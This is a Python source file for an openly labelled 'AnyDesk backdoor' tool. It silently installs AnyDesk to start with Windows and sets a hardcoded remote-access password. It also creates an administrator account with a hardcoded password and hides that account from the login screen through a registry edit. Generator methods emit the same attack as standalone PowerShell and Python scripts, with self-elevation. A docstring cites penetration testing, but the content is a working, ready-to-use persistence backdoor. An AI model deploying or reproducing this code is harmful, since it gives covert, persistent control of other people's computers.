"""
AnyDesk Backdoor Module
========================

This module provides functionality for managing AnyDesk backdoor operations
including installation, configuration, and session management.
"""

import os
import subprocess
import requests
import ctypes
import sys
import winreg
import json
import logging
from typing import Dict, Optional, Tuple
from datetime import datetime

logger = logging.getLogger(__name__)

class AnyDeskBackdoor:
    """
    AnyDesk Backdoor management class for penetration testing purposes.
    
    WARNING: This tool should only be used for authorized penetration testing
    and security assessment. Unauthorized use is illegal and unethical.
    """
    
    def __init__(self):
        self.install_path = "C:\\ProgramData\\AnyDesk"
        self.anydesk_url = "http://download.anydesk.com/AnyDesk.exe"
        self.default_config = {
            "password": "J9kzQ2Y0qO",
            "admin_username": "oldadministrator",
            "admin_password": "jsbehsid#Zyw4E3"
        }
        
    def is_admin(self) -> bool:
        """Check if the current process has administrator privileges."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def validate_config(self, config: Dict) -> Tuple[bool, str]:
        """Validate the provided configuration."""
        required_fields = ["install_path", "anydesk_url", "password", "admin_username", "admin_password"]
        
        for field in required_fields:
            if field not in config:
                return False, f"Missing required field: {field}"
        
        # Validate URL format
        if not config["anydesk_url"].startswith(("http://", "https://")):
            return False, "Invalid AnyDesk URL format"
        
        # Validate install path
        if not config["install_path"].startswith(("C:\\", "D:\\")):
            return False, "Invalid installation path"
        
        return True, "Configuration is valid"
    
    def download_anydesk(self, url: str, destination: str) -> Tuple[bool, str]:
        """Download AnyDesk executable."""
        try:
            logger.info(f"Downloading AnyDesk from {url}")
            response = requests.get(url, stream=True)
            response.raise_for_status()
            
            os.makedirs(os.path.dirname(destination), exist_ok=True)
            
            with open(destination, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            logger.info(f"AnyDesk downloaded to {destination}")
            return True, f"Downloaded to {destination}"
            
        except Exception as e:
            logger.error(f"Failed to download AnyDesk: {str(e)}")
            return False, f"Download failed: {str(e)}"
    
    def install_anydesk_silent(self, installer_path: str, install_path: str) -> Tuple[bool, str]:
        """Install AnyDesk silently."""
        try:
            logger.info(f"Installing AnyDesk to {install_path}")
            
            install_command = f'"{installer_path}" --install "{install_path}" --start-with-win --silent'
            result = subprocess.run(
                install_command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=300
            )
            
            if result.returncode == 0:
                logger.info("AnyDesk installed successfully")
                return True, "Installation completed successfully"
            else:
                logger.error(f"Installation failed: {result.stderr}")
                return False, f"Installation failed: {result.stderr}"
                
        except subprocess.TimeoutExpired:
            logger.error("Installation timed out")
            return False, "Installation timed out"
        except Exception as e:
            logger.error(f"Installation error: {str(e)}")
            return False, f"Installation error: {str(e)}"
    
    def set_anydesk_password(self, anydesk_exe: str, password: str) -> Tuple[bool, str]:
        """Set AnyDesk connection password."""
        try:
            logger.info("Setting AnyDesk password")
            
            password_command = f'"{anydesk_exe}" --set-password={password}'
            result = subprocess.run(
                password_command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=60
            )
            
            if result.returncode == 0:
                logger.info("Password set successfully")
                return True, "Password set successfully"
            else:
                logger.error(f"Failed to set password: {result.stderr}")
                return False, f"Failed to set password: {result.stderr}"
                
        except Exception as e:
            logger.error(f"Password setting error: {str(e)}")
            return False, f"Password setting error: {str(e)}"
    
    def get_anydesk_id(self, anydesk_exe: str) -> Tuple[bool, str, Optional[str]]:
        """Get the AnyDesk ID of the installation."""
        try:
            logger.info("Retrieving AnyDesk ID")
            
            id_command = f'"{anydesk_exe}" --get-id'
            result = subprocess.run(
                id_command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            
            if result.returncode == 0:
                anydesk_id = result.stdout.strip()
                logger.info(f"AnyDesk ID retrieved: {anydesk_id}")
                return True, "ID retrieved successfully", anydesk_id
            else:
                logger.error(f"Failed to get ID: {result.stderr}")
                return False, f"Failed to get ID: {result.stderr}", None
                
        except Exception as e:
            logger.error(f"ID retrieval error: {str(e)}")
            return False, f"ID retrieval error: {str(e)}", None
    
    def create_admin_user(self, username: str, password: str) -> Tuple[bool, str]:
        """Create a new administrative user account."""
        try:
            logger.info(f"Creating admin user: {username}")
            
            # Create user
            create_result = subprocess.run(
                ['net', 'user', username, password, '/add'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if create_result.returncode != 0:
                return False, f"Failed to create user: {create_result.stderr}"
            
            # Add to administrators group
            group_result = subprocess.run(
                ['net', 'localgroup', 'Administrators', username, '/add'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if group_result.returncode != 0:
                return False, f"Failed to add user to administrators: {group_result.stderr}"
            
            # Hide user from login screen
            try:
                key = winreg.CreateKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r'Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist'
                )
                winreg.SetValueEx(key, username, 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                logger.info("User hidden from login screen")
            except Exception as e:
                logger.warning(f"Failed to hide user from login screen: {str(e)}")
            
            logger.info("Admin user created successfully")
            return True, "Admin user created successfully"
            
        except Exception as e:
            logger.error(f"User creation error: {str(e)}")
            return False, f"User creation error: {str(e)}"
    
    def install_backdoor(self, config: Dict) -> Dict:
        """
        Complete AnyDesk backdoor installation process.
        
        Args:
            config: Configuration dictionary with installation parameters
            
        Returns:
            Dictionary with installation results
        """
        result = {
            "success": False,
            "message": "",
            "anydesk_id": None,
            "error": None,
            "timestamp": datetime.now().isoformat()
        }
        
        # Validate configuration
        is_valid, validation_message = self.validate_config(config)
        if not is_valid:
            result["error"] = validation_message
            result["message"] = "Configuration validation failed"
            return result
        
        # Check admin privileges
        if not self.is_admin():
            result["error"] = "Administrator privileges required"
            result["message"] = "Insufficient privileges"
            return result
        
        try:
            # Step 1: Download AnyDesk
            anydesk_exe = os.path.join(config["install_path"], "AnyDesk.exe")
            success, message = self.download_anydesk(config["anydesk_url"], anydesk_exe)
            if not success:
                result["error"] = message
                result["message"] = "Download failed"
                return result
            
            # Step 2: Install AnyDesk
            success, message = self.install_anydesk_silent(anydesk_exe, config["install_path"])
            if not success:
                result["error"] = message
                result["message"] = "Installation failed"
                return result
            
            # Step 3: Set password
            success, message = self.set_anydesk_password(anydesk_exe, config["password"])
            if not success:
                result["error"] = message
                result["message"] = "Password configuration failed"
                return result
            
            # Step 4: Create admin user
            success, message = self.create_admin_user(config["admin_username"], config["admin_password"])
            if not success:
                result["error"] = message
                result["message"] = "User creation failed"
                return result
            
            # Step 5: Get AnyDesk ID
            success, message, anydesk_id = self.get_anydesk_id(anydesk_exe)
            if success and anydesk_id:
                result["anydesk_id"] = anydesk_id
            
            # Success
            result["success"] = True
            result["message"] = "AnyDesk backdoor installed successfully"
            
            logger.info("AnyDesk backdoor installation completed successfully")
            
        except Exception as e:
            logger.error(f"Installation failed: {str(e)}")
            result["error"] = str(e)
            result["message"] = "Installation failed"
        
        return result
    
    def generate_script(self, config: Dict, script_type: str = "powershell") -> str:
        """Generate installation script."""
        if script_type.lower() == "powershell":
            return self._generate_powershell_script(config)
        elif script_type.lower() == "python":
            return self._generate_python_script(config)
        else:
            raise ValueError("Unsupported script type. Use 'powershell' or 'python'")
    
    def _generate_powershell_script(self, config: Dict) -> str:
        """Generate PowerShell installation script."""
        return f'''
function Install-AnyDesk {{
    param (
        [string]$InstallPath = "{config["install_path"]}",
        [string]$AnyDeskUrl = "{config["anydesk_url"]}",
        [string]$Password = "{config["password"]}",
        [string]$AdminUsername = "{config["admin_username"]}",
        [string]$AdminPassword = "{config["admin_password"]}"
    )

    try {{
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {{
            New-Item -Path $InstallPath -ItemType Directory
        }}

        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe")
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait
        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
        Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait
        
        Write-Host "Installation completed successfully."
    }}
    catch {{
        Write-Host "Error: $_"
        Write-Host "Installation failed."
    }}
}}

Install-AnyDesk
'''.strip()
    
    def _generate_python_script(self, config: Dict) -> str:
        """Generate Python installation script."""
        return f'''
import os
import subprocess
import requests
import ctypes
import sys
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_anydesk(install_path="{config["install_path"].replace("\\\\", "\\\\\\\\")}",
                   anydesk_url="{config["anydesk_url"]}",
                   password="{config["password"]}",
                   admin_username="{config["admin_username"]}",
                   admin_password="{config["admin_password"]}"):
    try:
        if is_admin():
            if not os.path.exists(install_path):
                os.makedirs(install_path)

            anydesk_exe_path = os.path.join(install_path, "AnyDesk.exe")
            with open(anydesk_exe_path, 'wb') as exe_file:
                response = requests.get(anydesk_url)
                exe_file.write(response.content)

            install_command = f'"{{anydesk_exe_path}}" --install "{{install_path}}" --start-with-win --silent'
            subprocess.run(install_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            set_password_command = f'"{{anydesk_exe_path}}" --set-password={{password}}'
            subprocess.run(set_password_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            subprocess.run(['net', 'user', admin_username, admin_password, '/add'], check=True)
            subprocess.run(['net', 'localgroup', 'Administrators', admin_username, '/add'], check=True)

            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\Userlist')
            winreg.SetValueEx(key, admin_username, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)

            get_id_command = f'"{{anydesk_exe_path}}" --get-id'
            subprocess.run(get_id_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("Installation completed successfully.")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    except Exception as e:
        print(f"Error: {{e}}")
        print("Installation failed.")

install_anydesk()
'''.strip()

# Module initialization
def create_anydesk_module():
    """Create and return an AnyDesk backdoor module instance."""
    return AnyDeskBackdoor()

# Export the main class
__all__ = ['AnyDeskBackdoor', 'create_anydesk_module']
